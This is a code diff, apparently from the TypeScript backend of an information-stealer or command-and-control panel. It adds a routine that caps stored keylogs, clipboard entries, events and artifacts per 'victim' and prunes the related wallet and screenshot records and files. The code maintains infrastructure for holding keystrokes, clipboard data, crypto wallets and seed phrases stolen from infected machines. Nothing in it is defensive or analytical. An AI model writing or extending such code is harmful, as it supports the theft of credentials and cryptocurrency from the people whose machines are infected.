@@ -4,6 +4,7 @@ import { join, resolve } from 'node:path';
 import { prisma } from './lib/db';
 import { env } from './lib/env';
 import { processArtifact, artifactDir } from './services/artifact';
+import { expireQueued } from './lib/tasks';
 
 let running = true;
 let lastRetention = 0;
@@ -22,6 +23,7 @@ async function tick(): Promise<void> {
     where: { status: 'running', leaseUntil: { lt: new Date(Date.now() - 60_000) }, attempts: { gte: 5 } },
     data: { status: 'expired', finishedAt: new Date(), error: 'lease expired 5 times' }
   });
+  await expireQueued();
   await prisma.victim.updateMany({
     where: {
       status: 'online',
@@ -76,8 +78,44 @@ async function retention(): Promise<void> {
     where: { createdAt: { lt: days(env.EVENT_RETENTION_DAYS) }, kind: { not: 'seed_found' } }
   });
 
+  await perVictimRetention();
   await pruneDiscordParts();
   await pruneOrphanFiles();
+}
+
+/** Bounds one noisy victim even when global retention is far away. */
+async function perVictimRetention(): Promise<void> {
+  const victims = await prisma.victim.findMany({ select: { id: true } });
+  for (const victim of victims) {
+    await prisma.$executeRaw`
+      DELETE FROM "Keylog" WHERE id IN (
+        SELECT id FROM "Keylog" WHERE "victimId" = ${victim.id}::uuid ORDER BY ts DESC OFFSET 5000
+      )`;
+    await prisma.$executeRaw`
+      DELETE FROM "ClipboardEntry" WHERE id IN (
+        SELECT id FROM "ClipboardEntry" WHERE "victimId" = ${victim.id}::uuid ORDER BY ts DESC OFFSET 2000
+      )`;
+    await prisma.$executeRaw`
+      DELETE FROM "Event" WHERE id IN (
+        SELECT id FROM "Event" WHERE "victimId" = ${victim.id}::uuid AND kind <> 'seed_found'
+        ORDER BY "createdAt" DESC OFFSET 5000
+      )`;
+    const extra = await prisma.artifact.findMany({
+      where: { victimId: victim.id },
+      orderBy: { createdAt: 'desc' },
+      skip: 100,
+      select: { id: true, containerPath: true }
+    });
+    for (const artifact of extra) {
+      await prisma.$transaction(async (tx) => {
+        await tx.wallet.deleteMany({ where: { artifactId: artifact.id } });
+        await tx.screenshot.deleteMany({ where: { artifactId: artifact.id } });
+        await tx.artifact.delete({ where: { id: artifact.id } });
+      }).catch(() => undefined);
+      await rm(artifactDir(artifact.id), { recursive: true, force: true }).catch(() => undefined);
+      await rm(artifact.containerPath, { force: true }).catch(() => undefined);
+    }
+  }
 }
 
 async function pruneDiscordParts(): Promise<void> {
